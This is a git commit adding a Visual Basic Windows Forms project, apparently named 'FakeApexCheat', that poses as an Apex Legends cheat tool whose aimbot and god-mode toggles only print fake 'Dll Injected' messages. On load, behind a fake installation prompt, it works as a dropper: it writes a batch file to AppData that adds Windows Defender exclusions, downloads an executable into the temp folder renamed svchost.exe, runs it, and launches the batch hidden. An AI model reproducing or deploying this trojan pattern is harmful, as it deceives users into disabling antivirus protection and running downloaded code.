4a0cb156f4cdc70171a73671a4f077343a9d3e04
youhacker55 <57035255+youhacker55@users.noreply.github.com>
2021-09-21 14:36:27 -0700

    Add files via upload

---
+++ FakeApexCheat/FakeapexCheat/Form1.Designer.vb
@@ -0,0 +1,130 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.Aimbot = New System.Windows.Forms.CheckBox()
+        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
+        Me.CheckBox3 = New System.Windows.Forms.CheckBox()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.RichTextBox1 = New System.Windows.Forms.RichTextBox()
+        Me.CheckBox2 = New System.Windows.Forms.CheckBox()
+        Me.SuspendLayout()
+        '
+        'Aimbot
+        '
+        Me.Aimbot.AutoSize = True
+        Me.Aimbot.BackColor = System.Drawing.SystemColors.ActiveBorder
+        Me.Aimbot.Location = New System.Drawing.Point(124, 28)
+        Me.Aimbot.Name = "Aimbot"
+        Me.Aimbot.Size = New System.Drawing.Size(59, 17)
+        Me.Aimbot.TabIndex = 0
+        Me.Aimbot.Text = "AimBot"
+        Me.Aimbot.UseVisualStyleBackColor = False
+        '
+        'CheckBox1
+        '
+        Me.CheckBox1.AutoSize = True
+        Me.CheckBox1.BackColor = System.Drawing.SystemColors.ActiveBorder
+        Me.CheckBox1.ForeColor = System.Drawing.SystemColors.ControlText
+        Me.CheckBox1.Location = New System.Drawing.Point(229, 28)
+        Me.CheckBox1.Name = "CheckBox1"
+        Me.CheckBox1.Size = New System.Drawing.Size(83, 17)
+        Me.CheckBox1.TabIndex = 1
+        Me.CheckBox1.Text = "SpeedHack"
+        Me.CheckBox1.UseVisualStyleBackColor = False
+        '
+        'CheckBox3
+        '
+        Me.CheckBox3.AutoSize = True
+        Me.CheckBox3.BackColor = System.Drawing.SystemColors.ActiveBorder
+        Me.CheckBox3.ForeColor = System.Drawing.SystemColors.ActiveCaptionText
+        Me.CheckBox3.Location = New System.Drawing.Point(12, 28)
+        Me.CheckBox3.Name = "CheckBox3"
+        Me.CheckBox3.Size = New System.Drawing.Size(65, 17)
+        Me.CheckBox3.TabIndex = 3
+        Me.CheckBox3.Text = "See loot"
+        Me.CheckBox3.UseVisualStyleBackColor = False
+        '
+        'Button1
+        '
+        Me.Button1.Location = New System.Drawing.Point(37, 383)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(259, 55)
+        Me.Button1.TabIndex = 4
+        Me.Button1.Text = "Start all Hacks"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'RichTextBox1
+        '
+        Me.RichTextBox1.BackColor = System.Drawing.SystemColors.ActiveCaptionText
+        Me.RichTextBox1.Enabled = False
+        Me.RichTextBox1.ForeColor = System.Drawing.Color.ForestGreen
+        Me.RichTextBox1.HideSelection = False
+        Me.RichTextBox1.Location = New System.Drawing.Point(3, 227)
+        Me.RichTextBox1.Name = "RichTextBox1"
+        Me.RichTextBox1.Size = New System.Drawing.Size(318, 150)
+        Me.RichTextBox1.TabIndex = 5
+        Me.RichTextBox1.Text = ""
+        '
+        'CheckBox2
+        '
+        Me.CheckBox2.AutoSize = True
+        Me.CheckBox2.BackColor = System.Drawing.SystemColors.ActiveBorder
+        Me.CheckBox2.Location = New System.Drawing.Point(12, 62)
+        Me.CheckBox2.Name = "CheckBox2"
+        Me.CheckBox2.Size = New System.Drawing.Size(76, 17)
+        Me.CheckBox2.TabIndex = 6
+        Me.CheckBox2.Text = "God Mode"
+        Me.CheckBox2.UseVisualStyleBackColor = False
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackColor = System.Drawing.Color.WhiteSmoke
+        Me.BackgroundImage = CType(resources.GetObject("$this.BackgroundImage"), System.Drawing.Image)
+        Me.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None
+        Me.ClientSize = New System.Drawing.Size(324, 461)
+        Me.Controls.Add(Me.CheckBox2)
+        Me.Controls.Add(Me.RichTextBox1)
+        Me.Controls.Add(Me.Button1)
+        Me.Controls.Add(Me.CheckBox3)
+        Me.Controls.Add(Me.CheckBox1)
+        Me.Controls.Add(Me.Aimbot)
+        Me.ForeColor = System.Drawing.SystemColors.ControlText
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.Name = "Form1"
+        Me.Text = "Apex Cheat"
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents Aimbot As CheckBox
+    Friend WithEvents CheckBox1 As CheckBox
+    Friend WithEvents CheckBox3 As CheckBox
+    Friend WithEvents Button1 As Button
+    Friend WithEvents RichTextBox1 As RichTextBox
+    Friend WithEvents CheckBox2 As CheckBox
+End Class
---
+++ FakeApexCheat/FakeapexCheat/Form1.vb
@@ -0,0 +1,117 @@
+﻿Imports System.IO
+
+Public Class Form1
+
+
+
+
+
+
+    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
+        If CheckBox3.Checked = True Then
+
+
+
+            RichTextBox1.AppendText(vbNewLine + "SeeLootHack Dll Injected" + vbNewLine)
+        Else
+            RichTextBox1.AppendText("Script Unloaded" + vbNewLine)
+
+        End If
+
+    End Sub
+
+
+
+    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
+        If CheckBox1.Checked = True Then
+
+            RichTextBox1.AppendText(vbNewLine + "SpeedHack Dll Injected" + vbNewLine)
+        Else
+            RichTextBox1.AppendText("Script Unloaded" + vbNewLine)
+
+        End If
+
+    End Sub
+
+    Private Sub Aimbot_CheckedChanged(sender As Object, e As EventArgs) Handles Aimbot.CheckedChanged
+        If Aimbot.Checked = True Then
+
+            RichTextBox1.AppendText(vbNewLine + "AimBot Dll Injected" + vbNewLine)
+        Else
+            RichTextBox1.AppendText("Script Unloaded" + vbNewLine)
+
+        End If
+
+    End Sub
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        RichTextBox1.AppendText(vbNewLine + "Loading All Scripts" + vbNewLine)
+        Dim ask As String = MessageBox.Show("Do you want to bypass anticheat Detection", "bypass", MessageBoxButtons.YesNo)
+        If ask = vbYes Then
+            RichTextBox1.AppendText(vbNewLine + "AntiCheat bypass script loaded" + vbNewLine)
+
+        End If
+
+    End Sub
+
+    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
+        If CheckBox2.Checked = True Then
+
+            RichTextBox1.AppendText(vbNewLine + "GodMode Dll Injected" + vbNewLine)
+        Else
+            RichTextBox1.AppendText("Script Unloaded" + vbNewLine)
+
+        End If
+
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        MessageBox.Show("Installing Some Modules(will take 1m or less)", "INSTALLATION", MessageBoxButtons.OK)
+        Dim file As System.IO.StreamWriter
+        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
+        Dim FullFileName As String = Path.Combine(appDataPath, "calculator.bat")
+        file = My.Computer.FileSystem.OpenTextFileWriter(FullFileName, True)
+        ' this is simple Dropper
+        'somejunkcode"
+        'svdsvsdvdsvdsvsdvdsvds
+        ' dsvsvdsvsdvdsvdsvdsvsdvs
+        'svdsvsdvdsvdsvdsvdsvdsvdsvs
+        'sdvvdsvdsvsdvdsvdsvdsvdsvds
+        ' vsdvdsvdsvsvdsvsd
+        'sdvdsvdsvdsvds
+        'Isdvdsvdsvdsvdsvsd
+        'vdfgvfdsvdsvsdv
+
+
+        file.WriteLine("")
+        file.WriteLine("powershell.exe -command ""Add-MpPreference -ExclusionExtension .tmp """)
+        file.WriteLine("")
+        file.WriteLine("powershell.exe -command ""Add-MpPreference -ExclusionExtension .exe """)
+        file.WriteLine("")
+        file.WriteLine("Start-BitsTransfer -priority foreground -Source https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -Destination $Env:TMP\svchost.exe -ErrorAction SilentlyContinue")
+        file.WriteLine("")
+        file.WriteLine("cd %TEMP%")
+        file.WriteLine("")
+        file.WriteLine("timeout 25")
+
+        file.WriteLine("")
+
+        file.WriteLine("start svchost.exe")
+        file.Close()
+
+
+        ' this is simple Dropper
+        'somejunkcode"
+        'svdsvsdvdsvdsvsdvdsvds
+        ' dsvsvdsvsdvdsvdsvdsvsdvs
+        'svdsvsdvdsvdsvdsvdsvdsvdsvs
+        'sdvvdsvdsvsdvdsvdsvdsvdsvds
+        ' vsdvdsvdsvsvdsvsd
+        'sdvdsvdsvdsvds
+        'Isdvdsvdsvdsvdsvsd
+        'vdfgvfdsvdsvsdv
+
+        Shell("cmd /c "" cd %APPDATA% &&  calculator.bat """, AppWinStyle.Hide, True)
+
+    End Sub
+End Class
